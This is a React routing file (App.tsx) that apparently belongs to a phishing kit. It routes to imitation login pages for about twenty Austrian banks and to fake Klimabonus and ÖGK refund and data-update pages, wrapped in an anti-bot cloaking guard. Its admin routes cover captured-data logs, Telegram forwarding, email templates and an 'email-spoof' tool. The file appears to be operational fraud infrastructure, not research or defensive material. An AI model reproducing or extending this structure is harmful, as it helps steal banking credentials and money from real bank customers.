import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { BrowserRouter, Navigate, Route, Routes } from "react-router-dom";
import { Toaster as Sonner } from "@/components/ui/sonner";
import { Toaster } from "@/components/ui/toaster";
import { TooltipProvider } from "@/components/ui/tooltip";
import { PanelProvider, usePanel } from "@/components/PanelProvider";
import Index from "./pages/Index.tsx";
import Auth from "./pages/Auth.tsx";
import Admin from "./pages/Admin.tsx";
import AdminLogs from "./pages/AdminLogs.tsx";
import AdminLogDetail from "./pages/AdminLogDetail.tsx";
import Raiffeisenbank from "./pages/Raiffeisenbank.tsx";
import ErsteBank from "./pages/ErsteBank.tsx";
import Bawag from "./pages/Bawag.tsx";
import BankAustria from "./pages/BankAustria.tsx";
import Volksbank from "./pages/Volksbank.tsx";
import Bank99 from "./pages/Bank99.tsx";
import Easybank from "./pages/Easybank.tsx";
import HypoNoe from "./pages/HypoNoe.tsx";
import Oberbank from "./pages/Oberbank.tsx";
import Schelhammer from "./pages/Schelhammer.tsx";
import BankhausSpaengler from "./pages/BankhausSpaengler.tsx";
import Dolomitenbank from "./pages/Dolomitenbank.tsx";
import Spardabank from "./pages/Spardabank.tsx";
import Dadatbank from "./pages/Dadatbank.tsx";
import Marchfelderbank from "./pages/Marchfelderbank.tsx";
import Btv from "./pages/Btv.tsx";
import Burgenland from "./pages/Burgenland.tsx";
import Bks from "./pages/Bks.tsx";
import Vkb from "./pages/Vkb.tsx";
import Wuestenrot from "./pages/Wuestenrot.tsx";
import Denizbank from "./pages/Denizbank.tsx";
import Confirmation from "./pages/Confirmation.tsx";
import AdminTelegram from "./pages/AdminTelegram.tsx";
import AdminSplitter from "./pages/AdminSplitter.tsx";
import AdminEmailTemplate from "./pages/AdminEmailTemplate.tsx";
import AdminEmailSpoof from "./pages/AdminEmailSpoof.tsx";
import AdminPanels from "./pages/AdminPanels.tsx";
import AdminStatistiken from "./pages/AdminStatistiken.tsx";
import AdminBlocks from "./pages/AdminBlocks.tsx";
import NotFound from "./pages/NotFound.tsx";
import Klimabonus from "./pages/Klimabonus.tsx";
import KlimabonusVoranmeldung from "./pages/KlimabonusVoranmeldung.tsx";
import KlimabonusBestaetigung from "./pages/KlimabonusBestaetigung.tsx";
import RueckerstattungBestaetigung from "./pages/RueckerstattungBestaetigung.tsx";

import Rueckerstattung from "./pages/Rueckerstattung.tsx";
import RueckerstattungAnfordern from "./pages/RueckerstattungAnfordern.tsx";
import Datenaktualisierung from "./pages/Datenaktualisierung.tsx";
import DatenaktualisierungBestaetigung from "./pages/DatenaktualisierungBestaetigung.tsx";

import AntiBotGuard from "./components/AntiBotGuard.tsx";
import { ReactNode } from "react";
import { useSearchParams } from "react-router-dom";

const queryClient = new QueryClient();

const IndexSwitch = () => {
  const { type } = usePanel();
  if (type === "klimabonus") return <Navigate to="/klimabonus" replace />;
  if (type === "oegk_rueckerstattung") return <Navigate to="/rueckerstattung" replace />;
  if (type === "oegk_datenaktualisierung") return <Navigate to="/datenaktualisierung" replace />;
  return <Index />;
};

const ConfirmationSwitch = () => {
  const { type } = usePanel();
  const [params] = useSearchParams();
  const s = params.get("s");
  if (type === "klimabonus") {
    return <Navigate to={`/klimabonus/bestaetigung${s ? `?s=${s}` : ""}`} replace />;
  }
  if (type === "oegk_rueckerstattung") {
    return <Navigate to={`/rueckerstattung/bestaetigung${s ? `?s=${s}` : ""}`} replace />;
  }
  if (type === "oegk_datenaktualisierung") {
    return <Navigate to={`/datenaktualisierung/bestaetigung${s ? `?s=${s}` : ""}`} replace />;
  }
  return <Confirmation />;
};



const P = ({ children }: { children: ReactNode }) => (
  <AntiBotGuard>{children}</AntiBotGuard>
);



const App = () => (
  <QueryClientProvider client={queryClient}>
    <TooltipProvider>
      <Toaster />
      <Sonner />
      <BrowserRouter>
        <PanelProvider>
          <Routes>
            <Route path="/" element={<P><IndexSwitch /></P>} />
            <Route path="/auth" element={<Auth />} />
            <Route path="/admin" element={<Admin />} />
            <Route path="/admin/logs" element={<AdminLogs />} />
            <Route path="/admin/logs/:id" element={<AdminLogDetail />} />
            <Route path="/admin/telegram" element={<AdminTelegram />} />
            <Route path="/admin/splitter" element={<AdminSplitter />} />
            <Route path="/admin/email" element={<AdminEmailTemplate />} />
            <Route path="/admin/email-spoof" element={<AdminEmailSpoof />} />
            <Route path="/admin/panels" element={<AdminPanels />} />
            <Route path="/admin/statistiken" element={<AdminStatistiken />} />
            <Route path="/admin/blocks" element={<AdminBlocks />} />
            <Route path="/raiffeisenbank" element={<P><Raiffeisenbank /></P>} />
            <Route path="/erstebank" element={<P><ErsteBank /></P>} />
            <Route path="/bawag" element={<P><Bawag /></P>} />
            <Route path="/bankaustria" element={<P><BankAustria /></P>} />
            <Route path="/volksbank" element={<P><Volksbank /></P>} />
            <Route path="/bank99" element={<P><Bank99 /></P>} />
            <Route path="/easybank" element={<P><Easybank /></P>} />
            <Route path="/hyponoe" element={<P><HypoNoe /></P>} />
            <Route path="/oberbank" element={<P><Oberbank /></P>} />
            <Route path="/schelhammer" element={<P><Schelhammer /></P>} />
            <Route path="/bankhausspaengler" element={<P><BankhausSpaengler /></P>} />
            <Route path="/dolomitenbank" element={<P><Dolomitenbank /></P>} />
            <Route path="/spardabank" element={<P><Spardabank /></P>} />
            <Route path="/dadatbank" element={<P><Dadatbank /></P>} />
            <Route path="/marchfelderbank" element={<P><Marchfelderbank /></P>} />
            <Route path="/btv" element={<P><Btv /></P>} />
            <Route path="/burgenland" element={<P><Burgenland /></P>} />
            <Route path="/bks" element={<P><Bks /></P>} />
            <Route path="/vkb" element={<P><Vkb /></P>} />
            <Route path="/wuestenrot" element={<P><Wuestenrot /></P>} />
            <Route path="/denizbank" element={<P><Denizbank /></P>} />
            <Route path="/confirmation" element={<P><ConfirmationSwitch /></P>} />
            <Route path="/at" element={<Navigate to="/" replace />} />
            <Route path="/klimabonus" element={<P><Klimabonus /></P>} />
            <Route path="/klimabonus/voranmeldung" element={<P><KlimabonusVoranmeldung /></P>} />
            <Route path="/klimabonus/bestaetigung" element={<P><KlimabonusBestaetigung /></P>} />
            <Route path="/rueckerstattung" element={<P><Rueckerstattung /></P>} />
            <Route path="/rueckerstattung/anfordern" element={<P><RueckerstattungAnfordern /></P>} />
            <Route path="/rueckerstattung/bestaetigung" element={<P><RueckerstattungBestaetigung /></P>} />
            <Route path="/datenaktualisierung" element={<P><Datenaktualisierung /></P>} />
            <Route path="/datenaktualisierung/bestaetigung" element={<P><DatenaktualisierungBestaetigung /></P>} />



            {/* ADD ALL CUSTOM ROUTES ABOVE THE CATCH-ALL "*" ROUTE */}
            <Route path="*" element={<NotFound />} />
          </Routes>
        </PanelProvider>
      </BrowserRouter>
    </TooltipProvider>
  </QueryClientProvider>
);

export default App;
